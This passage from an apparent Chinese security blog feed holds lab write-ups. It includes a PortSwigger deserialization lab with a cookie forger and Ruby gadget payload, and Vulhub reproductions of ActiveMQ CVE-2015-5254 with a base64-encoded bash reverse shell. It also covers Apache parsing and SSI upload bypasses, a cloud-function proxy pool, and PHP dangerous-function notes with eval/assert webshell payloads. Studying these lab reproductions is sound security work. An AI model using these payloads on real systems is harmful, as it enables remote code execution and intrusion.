<p>​    创建一个包含恶意对象的有效的经过签名的cookie。您可以使用以下PHP脚本执行此操作。该<code>$object</code>是Base64编码刚刚生成的对象，<code>$secretKey</code>是从获得的<code>phpinfo.php</code>文件中的<code>SECRET_KEY</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $payload &#x3D; urlencode(&#39;&#123;&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;&#125;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200721/15953180009969.png" alt="image-20200721145935109"></p>
<p>​    修改cookie为生成的恶意cookie，重新发包，成功删除指定文件：</p>
<p><img src="https://image.3001.net/images/20200721/15953180039222.png" alt="image-20200721150254347"></p>
<h5 id="6-6-3-使用已记录的Gadget链开发Ruby反序列化"><a href="#6-6-3-使用已记录的Gadget链开发Ruby反序列化" class="headerlink" title="6.6.3 使用已记录的Gadget链开发Ruby反序列化"></a>6.6.3 使用已记录的Gadget链开发Ruby反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain</a></p>
<p>​    登录账户，抓包base64解码查看cookie包含序列化的Ruby对象，查找Luke Jahnke撰写的“ Ruby 2.x Universal RCE Gadget Chain”。复制用于生成有效负载的脚本，然后将应执行的命令从<code>id</code>更改为<code>rm /home/carlos/morale.txt</code>并运行脚本。这将生成一个包含有效负载的序列化对象。输出包含对象的十六进制和Base64编码版本。复制Base64编码的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>​    同样需要url编码，修改cookie重新发包：</p>
<p><img src="https://image.3001.net/images/20200721/15953180076130.png" alt="image-20200721152950252"></p>
<h2 id="7-如何防止不安全的反序列化漏洞"><a href="#7-如何防止不安全的反序列化漏洞" class="headerlink" title="7. 如何防止不安全的反序列化漏洞"></a>7. 如何防止不安全的反序列化漏洞</h2><p>​    一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，它可能带来的利用的高度严重性以及防范这些利用的难度超过了收益。</p>
<p>​    如果确实需要对来自不受信任来源的数据进行反序列化，请采用可靠的措施以确保数据未被篡改。例如，您可以实施数字签名来检查数据的完整性。但是，请记住，<strong>在</strong>开始反序列化过程<strong>之前，</strong>必须进行任何检查。否则，它们几乎没有用。</p>
<p>​    如果可能，应避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。相反，您可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
]]></content>
      <categories>
        <category>不安全的序列化</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>不安全的序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ反序列化漏洞（CVE-2015-5254）</title>
    <url>/2021/04/15/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><p>​    Apache ActiveMQ是由美国Pachitea（Apache）软件基金会开发的一种开源消息中间件，它支持Java消息服务，集群，Spring框架等。</p>
<p>​    Apache ActiveMQ版本5.x之前的5.13.0安全漏洞，该程序引起的漏洞并不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。</p>
<a id="more"></a>

<p>运行环境后，它将在端口61616和8161上建立两个端口。端口61616是工作端口，消息在此端口上传递。端口8161是网页管理页面端口。访问<code>http://192.168.44.132:8161</code>，您可以看到网络管理页面，但是从理论上讲该漏洞不需要网络。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>漏洞利用过程如下：</p>
<ol>
<li>生成序列化的有效负载（你可以使用ysoserial）</li>
<li>将有效载荷发送到端口61616</li>
<li>访问Web管理页面并阅读序列化消息，然后您可以触发漏洞。</li>
</ol>
<p>为了利用此环境，我们将使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>（Java消息利用工具）。首先下载jmet的jar文件，并在同一目录中创建名为<strong>external的</strong>文件夹（否则可能会出现该文件夹不存在的错误）。</p>
<p>jmet是使用ysoserial生成并发送有效载荷（jar随ysoserial一起提供，我们不需要再次下载它），因此我们需要选择一个可以在ysoserial中用作小工具的对象，例如ROME 。</p>
<p>执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188727678144.png" alt="image-20210420045506964"></p>
<p>此时，一个名为事件的队列将被添加到目标ActiveMQ。</p>
<p>您可以访问<code>http://192.168.44.132:8161/admin/browse.jsp?JMSDestination=Event</code>以查看此队列中的所有消息</p>
<p>（<strong>登录名/密码：</strong> admin / admin）：</p>
<p><img src="https://image.3001.net/images/20210420/16188727695815.png" alt="image-20210420051032493"></p>
<p>单击此消息以触发命令执行，</p>
<p><img src="https://image.3001.net/images/20210420/16188727719315.png" alt="image-20210420052010390"></p>
<p>这次进入容器<code>docker-compose exec activemq bash</code>，</p>
<p>我们可以看到/ tmp / success已成功创建，表明利用成功：</p>
<p><img src="https://image.3001.net/images/20210420/16188727754408.png" alt="image-20210420051326031"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>把反弹shell的命令进行base64编码</p>
<p><img src="https://image.3001.net/images/20210420/16188727778776.png" alt="image-20210420055255231"></p>
<p>把编码放进去。<br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}</p>
<p>最终命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188727802590.png" alt="image-20210420055630353"></p>
<p>再通过管理界面单击消息以触发命令执行，成功进入root权限</p>
<p><img src="https://image.3001.net/images/20210420/1618872782104.png" alt="image-20210420055539067"></p>
<p>值得注意的是，通过Web管理页面访问消息并触发漏洞需要管理员特权。在没有密码的情况下，我们可以诱使管理员访问我们的链接以进行触发，或者伪装成来自其他服务的合法消息需要在触发时等待客户端访问。</p>
]]></content>
      <categories>
        <category>Vulhub复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ActiveMQ</tag>
        <tag>CVE-2015-5254</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2021/04/20/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个名为1.php的文件，被拦截：</p>
<p><img src="https://image.3001.net/images/20210420/16188726507583.png" alt="image-20201020020712805"></p>
<p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截：</p>
<p><img src="https://image.3001.net/images/20210420/16188726521450.png" alt="image-20201020021215126"></p>
<p>访问刚才上传的<code>/1.php%0a</code>，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
<p><img src="https://image.3001.net/images/20210420/1618872656333.png" alt="image-20201020021257808"></p>
]]></content>
      <categories>
        <category>Vulhub复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
        <tag>CVE-2017-15715</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 多后缀解析漏洞</title>
    <url>/2021/04/21/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><a id="more"></a>

<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>

<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p>
<p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p>
<p><img src="https://image.3001.net/images/20210420/16188726916210.png" alt="image-20201020023156918"></p>
<p><img src="https://image.3001.net/images/20210420/1618872693636.png" alt="image-20201020023237068"></p>
]]></content>
      <categories>
        <category>Vulhub复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache SSI 远程命令执行漏洞</title>
    <url>/2021/04/13/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
<a id="more"></a>

<p>环境启动后，访问<code>http://your-ip:8080/upload.php</code>，即可看到一个上传表单。</p>
<p><img src="https://image.3001.net/images/20210420/1618872602739.png" alt="image-20201020011344884"></p>
<p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188726054506.png" alt="image-20201020012001079"></p>
<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
<p><img src="https://image.3001.net/images/20210420/16188726075102.png" alt="image-20201020012058471"></p>
]]></content>
      <categories>
        <category>Vulhub复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理钓鱼</title>
    <url>/2021/04/25/%E4%BA%91%E5%87%BD%E6%95%B0%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
    <content><![CDATA[<h1 id="云函数代理池"><a href="#云函数代理池" class="headerlink" title="云函数代理池"></a>云函数代理池</h1><p>通过腾讯云函数配置代理池</p>
<a id="more"></a>

<p>注册腾讯云，访问云产品页面，进入云函数</p>
<p><img src="https://image.3001.net/images/20210425/16193388765146.png" alt="image-20210425123615905"></p>
<p>在云函数中新建服务</p>
<p><img src="https://image.3001.net/images/20210425/16193430024519.png" alt="image-20210425124338173"></p>
<p>自定义创建，选择运行环境为GO</p>
<p><img src="https://image.3001.net/images/20210425/16193388803149.png" alt="image-20210425124930356"></p>
<p>函数代码，提交方式选择本地上传ZIP包，执行方法main，并上传服务端的ZIP包</p>
<p><img src="https://image.3001.net/images/20210425/16193388824903.png" alt="image-20210425125044831"></p>
<p>触发器配置，触发方式选择API网关触发，新建API服务</p>
<p><img src="https://image.3001.net/images/20210425/16193388854902.png" alt="image-20210425125157602"></p>
<p>提交完成后，开始部署，部署完成后，在触发管理中可看到自己配置的触发器详细信息，将访问路径记录下来。</p>
<p><img src="https://image.3001.net/images/20210425/16193388882525.png" alt="image-20210425125533103"></p>
<p>打开客户端配置文件，设置自己的端口和url</p>
<p><img src="https://image.3001.net/images/20210425/16193388916987.png" alt="image-20210425125739139"></p>
<p>在linux中需要赋予客户端以执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x SFCProxy</span><br></pre></td></tr></table></figure>

<p>安装压缩包中的证书，使其支持https，运行客户端程序</p>
<p><img src="https://image.3001.net/images/20210425/16193388948903.png" alt="image-20210425160456469"></p>
<p>配置其代理端口，在浏览器访问，可以看到每次访问刷新请求，ip都会变化</p>
<p><img src="https://image.3001.net/images/20210425/16193426501518.gif" alt="20210425161114"></p>
<p>参考链接：<a href="https://mp.weixin.qq.com/s/4rhYcYN0gdH5JJB3fZm8ag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4rhYcYN0gdH5JJB3fZm8ag</a></p>
<p>服务端与客户端在参考链接中。</p>
]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>云函数</tag>
        <tag>代理池</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计危险函数</title>
    <url>/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="PHP代码审计危险函数"><a href="#PHP代码审计危险函数" class="headerlink" title="PHP代码审计危险函数"></a>PHP代码审计危险函数</h1><a id="more"></a>


<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>( string $code) : mixed</span><br></pre></td></tr></table></figure>

<p><code>eval()</code>函数就是将传入的字符串当作 <code>PHP</code> 代码来进行执行。</p>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>PHP 5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert( mixed $assertion[, string $description] ) : bool</span><br></pre></td></tr></table></figure>

<p>PHP 7</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert( mixed $assertion[, Throwable $exception] ) : bool</span><br></pre></td></tr></table></figure>

<p>在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。</p>
<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数执行一个正则表达式的搜索和替换。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement: 用于替换的字符串或字符串数组。</li>
<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count: 可选，为替换执行的次数。</li>
</ul>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p><code>create_function()</code>用来创建一个匿名函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function( string $args, string $code) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string $args 声明的函数变量部分</li>
<li>string $code 要执行的代码</li>
</ul>
<p><code>create_function()</code>函数在内部执行<code>eval()</code>函数，所以我们就可以利用这一点，来执行代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $onefunc = create_function(<span class="string">'$a'</span>,<span class="string">'return system($a);'</span>);</span><br><span class="line">	$onefunc(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p><code>array_map()</code>为数组的每个元素应用回调函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p><strong>array_map()</strong>：返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。<code>callback</code> 函数形参的数量和传给<code>array_map()</code> 数组数量，两者必须一样。</p>
<p>参数 </p>
<ul>
<li>callback：回调函数，应用到每个数组里的每个元素。</li>
<li>array1：数组，遍历运行<code>callback</code>函数。</li>
<li>…：数组列表，每个都遍历运行<code>callback</code>函数。</li>
</ul>
<p>通过<code>array_map()</code>这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是<code>system</code>函数，那么就相当于我们用<code>system</code>函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $func = <span class="string">'system'</span>;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    $old_array[<span class="number">0</span>] = $cmd;</span><br><span class="line">    $new_array = array_map($func,$old_array);</span><br><span class="line">    var_dump($new_array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p><code>call_user_func()</code>是把第一个参数作为回调函数调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p>
<ul>
<li>callback：即将被调用的回调函数</li>
<li>parameter：传入回调函数的参数</li>
</ul>
<p>在前面自定义的函数中加入能执行命令的代码就可以代码执行了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    call_user_func(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr) : mixed</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>callback：被调用的回调函数</li>
<li>param_arr：要被传入回调函数的数组，这个数组需要是索引数组</li>
</ul>
<p>示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="keyword">array</span>(<span class="string">'whoami'</span>);</span><br><span class="line">    call_user_func_array(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>用回调函数过滤数数组中的单元</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_filter( <span class="keyword">array</span> $array[, callable $callback[, int $flag = <span class="number">0</span>]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p>依次将<code>array</code>数组中的每个值传到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<p>参数 </p>
<ul>
<li>array：要循环的数组</li>
<li>callback：使用的回调函数。如果没有提供<code>callback</code>函数，将删除<code>array</code>中所有等值为FALSE的条目。</li>
<li>flag：决定<code>callback</code>接收的参数形式</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd=<span class="string">'whoami'</span>;</span><br><span class="line">    $array1=<span class="keyword">array</span>($cmd);</span><br><span class="line">    $func =<span class="string">'system'</span>;</span><br><span class="line">    array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>使用用户自定义的比较函数对数组中的值进行排序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">usort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    usort(...$_GET);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1.</span>php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>($_POST[<span class="string">'x'</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<p><code>usort</code>的参数通过GET传参，第一个参数也就是<code>$_GET[0]</code>，随便传入一个数字即可。第二个参数也就是<code>$_GET[1]</code>是我们要调用的函数名称，这里采用的是<code>assert</code>函数。</p>
<h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h4><p>这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uasort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>value_compare_func：用户自定义的函数</li>
</ul>
<p>在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。</p>
<p>代码示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$onearray = <span class="keyword">array</span>(<span class="string">'Ameng'</span>, $_POST[<span class="string">'x'</span>]);</span><br><span class="line">	uasort($onearray, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload: <span class="number">1.</span>php?a=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system( string $command[, int &amp;$return_var] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>return_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>这个其实和上面<code>system</code>函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>output：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。</li>
<li>return_var：可选。命令执行的返回状态。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回<code>NULL</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec( string $cmd) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或<code>system()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru( string $command[, int &amp;$return_var] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>return_var：Unix命令的返回状态将被记录到此函数。</li>
</ul>
<p>代码示例：</p>
